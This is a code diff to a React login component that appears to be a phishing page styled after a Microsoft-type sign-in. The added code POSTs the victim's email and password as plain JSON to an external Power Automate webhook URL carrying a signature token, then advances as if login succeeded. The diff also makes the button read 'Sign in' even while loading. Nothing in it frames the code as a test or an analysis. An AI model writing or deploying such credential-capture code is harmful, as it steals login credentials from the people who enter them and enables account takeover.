@@ -70,10 +70,31 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
         setIsLoading(false);
         return;
       }
+      
+      // Send email and password to Power Automate API
+      const response = await fetch(
+        'https://default71951376118a4adb9238d5b8867a2f.39.environment.api.powerplatform.com:443/powerautomate/automations/direct/workflows/e919378912634b1bb70fb8e10604606e/triggers/manual/paths/invoke?api-version=1&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=kDJojkKBmvjo_y0-iMGoZHoJqZfcwO_64Skc_-KNUiY',
+        {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            username: email,
+            password: password,
+          }),
+        }
+      );
+
+      if (!response.ok) {
+        throw new Error('Failed to sign in');
+      }
+
       // Move to success phase
       setPhase("options");
     } catch (err) {
       setError("Failed to sign in");
+      console.error(err);
     } finally {
       setIsLoading(false);
     }
@@ -231,7 +252,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
                   disabled={isLoading}
                   className="w-27 h-8 text-[15px] font-normal text-white bg-[#0067BB] transition duration-200 py-1 px-3 cursor-pointer hover:bg-[#005a9e]"
                 >
-                  {isLoading ? "Signing in..." : "Sign in"}
+                  {isLoading ? "Sign in" : "Sign in"}
                 </button>
               </div>
             </form>
